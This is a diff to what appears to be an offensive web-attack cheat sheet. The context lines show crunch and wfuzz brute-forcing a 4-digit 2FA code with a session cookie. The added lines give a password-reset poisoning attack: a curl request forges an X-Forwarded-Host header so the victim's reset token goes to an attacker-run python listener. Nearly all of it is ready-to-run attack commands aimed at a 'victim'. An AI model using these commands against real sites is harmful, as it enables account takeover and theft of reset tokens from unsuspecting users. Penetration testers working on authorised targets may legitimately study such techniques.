@@ -37,3 +37,10 @@ Weak numeric 2FA/OTP — a short code (4 digits = 10,000 combos) with no rate li
 crunch 4 4 0123456789 -o 4-digits.txt
 wfuzz -w 4-digits.txt -d "otp=FUZZ" -b "<session-cookie>" <target-2fa-endpoint> --hl <wrong-code-response-size>
 ```
+
+Password-reset poisoning via Host header — if the reset-link email builds its URL from a client-supplied header instead of a hardcoded server config, a forged header redirects the victim's reset token straight to you:
+```bash
+curl -X POST <target>/forgot-password -H 'X-Forwarded-Host: <your-listener>' -d 'email=<victim-email>'
+python3 -m http.server 80     # victim's mail client/server fetches the link preview, or the victim clicks it -> token hits your listener's access log
+```
+Try `X-Forwarded-Host` first, then plain `Host` if that's ignored — which one the app trusts varies by stack/proxy config.
